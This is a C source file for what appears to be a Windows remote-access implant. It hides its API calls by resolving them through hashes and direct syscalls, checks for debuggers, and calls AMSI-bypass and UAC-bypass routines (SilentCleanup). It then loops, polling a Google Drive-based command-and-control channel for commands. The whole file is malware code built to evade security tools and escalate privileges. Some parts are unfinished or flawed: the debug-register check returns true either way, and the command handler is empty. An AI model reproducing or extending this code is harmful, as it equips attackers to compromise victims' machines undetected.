#define UNICODE
#define _UNICODE
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "crypto.h"
#include "api_hashes.h"
#include "gdrive_c2.h"
#include "advanced_bypass.h"
#include "syscalls.h"

static PVOID g_SyscallGadget = NULL;

typedef struct _API_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQuerySystemInformation;

    ULONG_PTR CreateWaitableTimerW;
    ULONG_PTR SetWaitableTimer;
    ULONG_PTR GetSystemInfo;
    ULONG_PTR GetModuleFileNameW;
} API_TABLE;

static API_TABLE g_ApiTable = {0};

static PVOID GetModuleBaseByHash(uint32_t hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY current = head->Flink;

    while (current != head) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) return entry->DllBase;
        current = current->Flink;
    }
    return NULL;
}

static PVOID ResolveApiByHash(PVOID moduleBase, uint32_t hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)((PBYTE)moduleBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        if (HashStringDjb2A((LPCSTR)((PBYTE)moduleBase + pNames[i])) == hash) {
            return (PVOID)((PBYTE)moduleBase + pFuncs[pOrds[i]]);
        }
    }
    return NULL;
}

static void InitializeApiTable() {
    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);

    g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
    g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
    
    g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
    g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);

    g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
    g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
    g_ApiTable.GetSystemInfo = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetSystemInfo);
    g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
}

static BOOL IsEnvironmentSafe() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return FALSE;
    if (peb->NtGlobalFlag & 0x70) return FALSE;

    PVOID pHeap = (PVOID)*(PULONG_PTR)((PBYTE)peb + (sizeof(PVOID) * 2));
    DWORD heapFlags = *(PDWORD)((PBYTE)pHeap + (sizeof(PVOID) * 3));
    if (heapFlags & ~HEAP_GROWABLE) return FALSE;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
    }

    return TRUE;
}

int main() {
    if (!IsEnvironmentSafe()) return 0;
    
    g_SyscallGadget = FindSyscallGadget();
    InitializeApiTable();

    BypassAMSI_DataOnly();

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    BypassUAC_SilentCleanupHardened(selfPath);

    char cmdBuffer[1024];
    while (TRUE) {
        if (GDrive_CheckForCommands(cmdBuffer, sizeof(cmdBuffer))) {
        }
        StealthSleep(60000); 
    }

    return 0;
}
